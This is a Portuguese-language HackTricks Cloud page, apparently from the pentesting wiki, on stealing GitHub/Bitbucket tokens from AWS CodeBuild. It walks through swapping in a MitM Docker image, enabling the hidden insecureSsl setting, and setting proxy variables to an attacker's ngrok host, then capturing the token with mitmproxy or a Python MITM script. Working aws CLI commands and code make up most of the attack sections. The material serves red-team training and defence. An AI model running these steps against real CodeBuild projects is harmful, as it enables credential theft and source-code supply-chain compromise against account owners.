# AWS Codebuild - Token Leakage

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Recuperar Tokens Configurados do Github/Bitbucket

Primeiro, verifique se h√° credenciais de origem configuradas que voc√™ poderia vazar:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Se voc√™ descobrir que a autentica√ß√£o para, por exemplo, Github est√° configurada na conta, voc√™ pode **exfiltrar** esse **acesso** (**token GH ou token OAuth**) fazendo com que o Codebuild **use uma imagem docker espec√≠fica** para executar a constru√ß√£o do projeto.

Para isso, voc√™ poderia **criar um novo projeto Codebuild** ou alterar o **ambiente** de um existente para definir a **imagem Docker**.

A imagem Docker que voc√™ poderia usar √© [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta √© uma imagem Docker muito b√°sica que ir√° definir as **vari√°veis de ambiente `https_proxy`**, **`http_proxy`** e **`SSL_CERT_FILE`**. Isso permitir√° que voc√™ intercepte a maior parte do tr√°fego do host indicado em **`https_proxy`** e **`http_proxy`** e confie no SSL CERT indicado em **`SSL_CERT_FILE`**.

1. **Crie e fa√ßa upload da sua pr√≥pria imagem Docker MitM**
* Siga as instru√ß√µes do reposit√≥rio para definir o endere√ßo IP do seu proxy e configurar seu certificado SSL e **construa a imagem docker**.
* **N√ÉO DEFINA `http_proxy`** para n√£o interceptar solicita√ß√µes ao endpoint de metadados.
* Voc√™ poderia usar **`ngrok`** como `ngrok tcp 4444` para definir o proxy para o seu host.
* Uma vez que voc√™ tenha a imagem Docker constru√≠da, **fa√ßa upload para um reposit√≥rio p√∫blico** (Dockerhub, ECR...)
2. **Defina o ambiente**
* Crie um **novo projeto Codebuild** ou **modifique** o ambiente de um existente.
* Defina o projeto para usar a **imagem Docker gerada anteriormente**.

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Defina o proxy MitM no seu host**

* Como indicado no **reposit√≥rio Github**, voc√™ poderia usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
A **vers√£o do mitmproxy utilizada foi 9.0.1**, foi relatado que com a vers√£o 10 isso pode n√£o funcionar.
{% endhint %}

4. **Execute a constru√ß√£o e capture as credenciais**

*   Voc√™ pode ver o token no cabe√ßalho **Authorization**:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Isso tamb√©m pode ser feito a partir do aws cli com algo como

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### Via insecureSSL

**Codebuild** projetos t√™m uma configura√ß√£o chamada **`insecureSsl`** que est√° oculta na web e voc√™ s√≥ pode alter√°-la pela API.\
Ativar isso permite que o Codebuild se conecte ao reposit√≥rio **sem verificar o certificado** oferecido pela plataforma.

* Primeiro, voc√™ precisa enumerar a configura√ß√£o atual com algo como:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
* Em seguida, com as informa√ß√µes coletadas, voc√™ pode atualizar a configura√ß√£o do projeto **`insecureSsl`** para **`True`**. O seguinte √© um exemplo da minha atualiza√ß√£o de um projeto, note o **`insecureSsl=True`** no final (esta √© a √∫nica coisa que voc√™ precisa mudar na configura√ß√£o coletada).
* Al√©m disso, adicione tamb√©m as vari√°veis de ambiente **http\_proxy** e **https\_proxy** apontando para o seu tcp ngrok como: 

{% code overflow="wrap" %}
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "https://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
{% endcode %}

* Em seguida, execute o exemplo b√°sico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) na porta indicada pelas vari√°veis de proxy (http\_proxy e https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Finalmente, clique em **Build the project**, as **credenciais** ser√£o **enviadas em texto claro** (base64) para a porta mitm:

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### ~~Via protocolo HTTP~~

{% hint style="success" %}
**Essa vulnerabilidade foi corrigida pela AWS em algum momento da semana do dia 20 de fevereiro de 2023 (acho que na sexta-feira). Portanto, um atacante n√£o pode mais abusar disso :)**
{% endhint %}

Um atacante com **permiss√µes elevadas em um CodeBuild poderia vazar o token do Github/Bitbucket** configurado ou, se as permiss√µes foram configuradas via OAuth, o **token OAuth tempor√°rio usado para acessar o c√≥digo**.

* Um atacante poderia adicionar as vari√°veis de ambiente **http\_proxy** e **https\_proxy** ao projeto CodeBuild apontando para sua m√°quina (por exemplo `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* Em seguida, mude a URL do reposit√≥rio do github para usar HTTP em vez de HTTPS, por exemplo: `http://github.com/carlospolop-forks/TestActions`
* Em seguida, execute o exemplo b√°sico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) na porta apontada pelas vari√°veis de proxy (http\_proxy e https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Finalmente, clique em **Build the project**, as **credenciais** ser√£o **enviadas em texto claro** (base64) para a porta mitm:

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Agora um atacante poder√° usar o token de sua m√°quina, listar todos os privil√©gios que possui e (ab)usar mais facilmente do que usando o servi√ßo CodeBuild diretamente.
{% endhint %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
